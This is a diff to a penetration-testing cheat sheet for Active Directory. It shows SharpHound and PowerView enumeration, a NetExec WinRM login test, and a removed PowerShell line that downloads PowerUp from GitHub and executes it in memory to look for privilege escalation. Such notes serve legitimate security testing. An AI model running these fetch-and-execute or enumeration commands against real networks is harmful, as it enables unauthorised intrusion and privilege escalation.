@@ -125,10 +125,11 @@ https://github.com/SpecterOps/SharpHound
 .\SharpHound.exe -c All -d domain.local --zipfilename bloodhound.zip
 ```
 
-## PowerView.ps1 (Source)
+## PowerView.ps1 (Kali Source)
+Source: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
 PowerShell module with commands similar to the official Active Directory module. Dot source (`. .\PowerView.ps1`) to use its functions.
 ```
-https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
 ```
 
 ## Get domain information (PowerView)
@@ -160,12 +161,7 @@ Get-DomainComputer
 Find-DomainShare -CheckShareAccess
 ```
 
-## Download PowerUp for privilege escalation
-```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
-Invoke-AllChecks
-```
-
+# Netexec Enumeration
 ## Test WinRM access with NetExec
 ```bash
 netexec winrm -i $IP -u username -p password
